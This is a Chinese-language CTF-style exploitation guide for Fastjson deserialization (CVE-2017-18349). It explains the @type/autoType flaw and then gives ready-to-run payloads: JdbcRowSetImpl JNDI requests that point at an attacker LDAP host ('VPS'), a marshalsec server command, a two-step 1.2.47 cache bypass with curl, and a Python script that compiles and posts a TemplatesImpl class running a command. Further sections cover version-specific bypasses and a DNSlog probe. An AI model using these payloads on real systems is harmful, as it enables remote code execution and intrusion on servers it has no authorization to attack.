---
title: Fastjson 反序列化（autoType / @type）
category: web
tags: [fastjson, autotype, jndi, 反序列化, cve-2017-18349]
signals: [fastjson 依赖, json 请求体, 有 type 字段注入, autoType, 1.2.x 版本, parseObject 用户输入, TemplatesImpl, cve-2017-18349, 反序列化漏洞]
difficulty: medium
source: "NVD / 公开 PoC"
tools: [fastjson, java, marshalsec, python]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 请求 body 是 JSON，且系统对字段名"照单全收"（多传字段不报错）。
- 错误信息里有 `fastjson`、`com.alibaba.fastjson`、`JSONException`、`autoType is not support`。
- 依赖里有 `fastjson` 1.2.x（1.2.24 以下直接可 RCE）。
- 关键词：fastjson、@type、autoType、parseObject。
- 变体：fastjson 1.2.47 的 `cache` 绕过、1.2.68 `autoTypeSupport` 白名单绕过。

## 二、原理

Fastjson 在反序列化时读取 JSON 里的 `@type` 字段，用它**决定实例化的类**并调用 setter/getter。若允许 `autoType`（或版本存在绕过），攻击者可指定 `com.sun.rowset.JdbcRowSetImpl`：

```json
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://VPS:1389/Exploit",
  "autoCommit": true
}
```

`setAutoCommit()` 触发 `connect()` → JNDI lookup → RCE（JDK 8u191 前远程 codebase）。

`TemplatesImpl` 链（不出网时可用）：
```json
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
 "_bytecodes":["<base64 class>"],
 "_name":"a","_tfactory":{},
 "_outputProperties":{}}
```

## 三、解题步骤

1. 确认 fastjson 与版本（错误信息/依赖文件）。
2. 用 `JdbcRowSetImpl` + JNDI 打（需 LDAP 服务）。
3. 若不出网，用 `TemplatesImpl` 链。
4. 版本 1.2.47+ 的 `autoTypeSupport` 被关时，用 `{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}` 缓存绕过。

## 四、可直接运行的脚本

版本 1.2.24 及以下 —— JNDI 链：

```bash
# 1. 起 LDAP + HTTP（marshalsec）
java -cp marshalsec-0.0.3-all.jar marshalsec.jndi.LDAPRefServer \
     "http://VPS:8000/#Exploit" 1389

# 2. 发送 payload
curl -s "http://TARGET/api" -H "Content-Type: application/json" -d '{
  "@type":"com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName":"ldap://VPS:1389/Exploit",
  "autoCommit":true
}'
```

1.2.47 的 cache 绕过（两次请求）：

```bash
# 第一步：把恶意类缓存到 mappings
curl -s "http://TARGET/api" -H "Content-Type: application/json" -d '{
  "name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},
  "x":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}
}'

# 第二步：直接用类名（此时命中缓存，不再校验黑名单）
curl -s "http://TARGET/api" -H "Content-Type: application/json" -d '{
  "x":{"@type":"com.sun.rowset.JdbcRowSetImpl",
       "dataSourceName":"ldap://VPS:1389/Exploit","autoCommit":true}
}'
```

TemplatesImpl 链（不出网）：

```python
import base64, json, subprocess, requests

# 1. 用 ysoserial 的 TemplatesImpl 生成恶意 class 字节
#    或者用 javac 编译一个 static 代码块执行命令的类
JAVA = r'''
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
public class Evil extends AbstractTranslet {
    public Evil() { super(); }
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d,
        com.sun.org.apache.xml.internal.serializer.SerializationHandler[] h) {}
    static { try { Runtime.getRuntime().exec("calc"); } catch (Exception e) {} }
}
'''
open("Evil.java", "w").write(JAVA)
subprocess.run(["javac", "Evil.java"], check=True)
raw = open("Evil.class", "rb").read()
b64 = base64.b64encode(raw).decode()

payload = {
    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes": [b64],
    "_name": "a",
    "_tfactory": {},
    "_outputProperties": {},
}
r = requests.post("http://TARGET/api", json=payload)
print(r.status_code, r.text[:300])
```

## 五、常见坑 / 变体

- **JDK 版本**：`JdbcRowSetImpl` 依赖 `com.sun.rowset` 模块，JDK 9+ 需 `--add-modules java.sql.rowset`；`TemplatesImpl` 有 `_outputProperties` 的 setter 触发。
- **1.2.68+ 的 safeMode**：`JSONReader.Feature.SupportAutoType` 未开则 `@type` 被忽略，需找业务代码里手动 `ParserConfig.getGlobalInstance().addAccept(...)` 的类。
- **1.2.80 的黑名单**：仍可用 `org.apache.tomcat.dbcp.dbcp2.BasicDataSource`（需要 Tomcat 8.0+）。
- **`@type` 必须是大写开头的类名**，JSON 解析器大小写敏感；`feature` 里若有 `IgnoreCase` 可小写。
- **`autoCommit` 必须是 `true`**（字符串 `"true"` 不行，布尔才有 setter 触发）。
- 变体：**fastjson 1.1.x** 用 `TemplatesImpl` 直接打；**Jackson** 用 `@class` + `enableDefaultTyping`。
- 变体：**签到式探测**：先发 `{"@type":"java.net.Inet4Address","val":"x.dnslog.cn"}` 看回连，判定是否可 RCE。

## 六、参考来源

- [NVD - CVE-2017-18349（fastjson）](https://nvd.nist.gov/vuln/detail/CVE-2017-18349)
- [fastjson 官方 issue / 安全公告](https://github.com/alibaba/fastjson/wiki/security_update_20220523)
- [PayloadsAllTheThings - Java deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)
- [marshalsec（JNDI/LDAP）](https://github.com/mbechler/marshalsec)
- [fastjson 1.2.47 绕过分析（公开 PoC 汇总）](https://github.com/alibaba/fastjson/wiki/security_update_20220523)
